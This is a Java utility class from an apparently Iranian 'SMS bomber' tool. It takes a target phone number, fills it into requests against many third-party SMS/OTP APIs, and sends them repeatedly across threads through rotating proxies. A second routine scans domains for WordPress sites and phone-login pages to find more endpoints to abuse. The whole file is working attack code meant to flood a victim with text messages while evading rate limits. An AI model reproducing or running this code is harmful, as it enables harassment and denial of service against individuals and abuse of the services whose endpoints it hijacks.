package ir.mrsf.smsbomber.utils;

import com.google.gson.*;
import ir.mrsf.smsbomber.SMSBomber;
import ir.mrsf.smsbomber.enums.ContentType;
import ir.mrsf.smsbomber.enums.Method;
import ir.mrsf.smsbomber.enums.ScanType;
import ir.mrsf.smsbomber.managers.ProxyManager;
import ir.mrsf.smsbomber.models.API;
import lombok.experimental.UtilityClass;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;

@UtilityClass
public class RequestUtil {
    private static final Gson gson;
    private static ProxyManager proxyManager;

    static {
        gson = new Gson();
        proxyManager = null;
    }

    public void sendSMSRequest(ExecutorService executor, String phone, boolean debug) {
        try {

            final List<API> apiList = SMSBomber.getSmsBomber().getConfigManager().getApiList();
            for (API api : apiList) {
                final JsonElement payload = api.payload();
                ContentType contentType;
                String body;
                if (payload instanceof JsonObject payloadJson) {
                    if (api.forceContentType() == null) {
                        contentType = ContentType.JSON;
                    } else {
                        contentType = ContentType.fromString(api.forceContentType());
                    }
                    body = gson.toJson(payloadJson, JsonObject.class);
                } else if (payload instanceof JsonPrimitive jsonPrimitive && jsonPrimitive.isString()) {
                    if (api.forceContentType() == null) {
                        contentType = ContentType.www_form_urlencoded;
                    } else {
                        contentType = ContentType.fromString(api.forceContentType());
                    }
                    body = jsonPrimitive.getAsString();
                } else {
                    contentType = null;
                    body = null;
                }
                if (api.method() == Method.POST) {
                    if (contentType == null) continue;
                    if (body == null) continue;
                }
                final String phoneNumber;
                if (api.withOutZero()) {
                    phoneNumber = phone.replaceFirst("^0+", "");
                } else {
                    phoneNumber = phone;
                }
                for (int i = 0; i < api.repeat(); i++) {
                    switch (api.method()) {
                        case POST -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url())
                                , contentType, StringUtil.setPlaceHolder(phoneNumber, body),
                                (data) -> {
                                    final JsonElement jsonElement = JsonParser.parseString(data);
                                    if (debug) {
                                        sendLog(api.name(), jsonElement.isJsonObject() || jsonElement.isJsonArray() ?
                                                gson.toJson(jsonElement) : data
                                        );
                                    } else {
                                        sendLog(api.name(), null);
                                    }
                                }
                        ));
                        case GET -> executor.submit(() -> smsRequest(StringUtil.setPlaceHolder(phoneNumber, api.url()),
                                (data) -> {
                                    final JsonElement jsonElement = JsonParser.parseString(data);
                                    if (debug) {
                                        sendLog(api.name(), jsonElement.isJsonObject() || jsonElement.isJsonArray() ?
                                                gson.toJson(jsonElement) : data
                                        );
                                    } else {
                                        sendLog(api.name(), null);
                                    }
                                }
                        ));
                        default -> throw new RuntimeException("Invalid method");
                    }
                }
                Thread.sleep(100);
            }
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public List<String> findSites(
            int timeout, int maxThreads, ScanType scanType, String[] keywords, List<String> domains
    ) {
        final List<String> findDomains = new ArrayList<>();
        final ExecutorService executor = Executors.newFixedThreadPool(maxThreads);
        final AtomicInteger counter = new AtomicInteger(0);
        final int totalDomains = domains.size();

        for (String domain : domains) {
            executor.submit(() -> {
                try {
                    switch (scanType) {
                        case wordpress -> {
                            if (WebUtil.isWordPressSite(timeout, domain)) {
                                synchronized (findDomains) {
                                    findDomains.add(domain);
                                }
                            }
                        }
                        case phone -> {
                            if (WebUtil.usesPhoneLogin(timeout, domain, keywords)) {
                                synchronized (findDomains) {
                                    findDomains.add(domain);
                                }
                            }
                        }
                    }

                    final int progress = counter.incrementAndGet();
                    if (progress % 10 == 0 || progress == totalDomains) {
                        System.out.println("Progress: " + progress + "/" + totalDomains + " | " +
                                           findDomains.size() + " find" +
                                           " (" + (progress * 100 / totalDomains) + "%)");
                    }
                } catch (Exception e) {
                    System.err.println("Error processing " + domain + ": " + e.getMessage());
                }
            });
        }

        executor.shutdown();
        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            System.err.println("Process interrupted: " + e.getMessage());
            Thread.currentThread().interrupt();
        }

        return findDomains;
    }

    private void sendLog(String name, String data) {
        if (data == null) {
            System.out.println("Sent from: " + name);
            return;
        }
        System.out.println("Sent from: " + name + " data: " + data);
    }

    private void smsRequest(String url, ContentType contentType, String body, Consumer<String> callback) {
        try {
            Thread.sleep(500);
            final byte[] postData = body.getBytes(StandardCharsets.UTF_8);
            final HttpURLConnection connection = getHttpURLConnectionSMS(url, contentType, postData);

            connection.setDoOutput(true);
            try (OutputStream outputStream = connection.getOutputStream()) {
                outputStream.write(postData);
            }

            callback.accept(readResponse(connection));
        } catch (Exception e) {
            callback.accept(e.getMessage());
        }
    }


    private void smsRequest(String url, Consumer<String> callback) {
        try {
            Thread.sleep(500);
            proxyManager = SMSBomber.getSmsBomber().getProxyManager();
            final HttpURLConnection connection = (HttpURLConnection) new URL(url)
                    .openConnection(proxyManager.getNextProxy());
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(3000);
            connection.setReadTimeout(3000);

            callback.accept(readResponse(connection));
        } catch (Exception e) {
            callback.accept(e.getMessage());
        }
    }

    private String readResponse(HttpURLConnection connection) throws IOException {
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }


    private HttpURLConnection getHttpURLConnectionSMS(String url, ContentType contentType, byte[] postData) throws IOException {
        proxyManager = SMSBomber.getSmsBomber().getProxyManager();
        final HttpURLConnection connection = (HttpURLConnection) new URL(url).
                openConnection(proxyManager.getNextProxy());
        connection.setDoOutput(true);
        connection.setInstanceFollowRedirects(false);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", contentType.getString());
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
        connection.setUseCaches(false);
        return connection;
    }
}
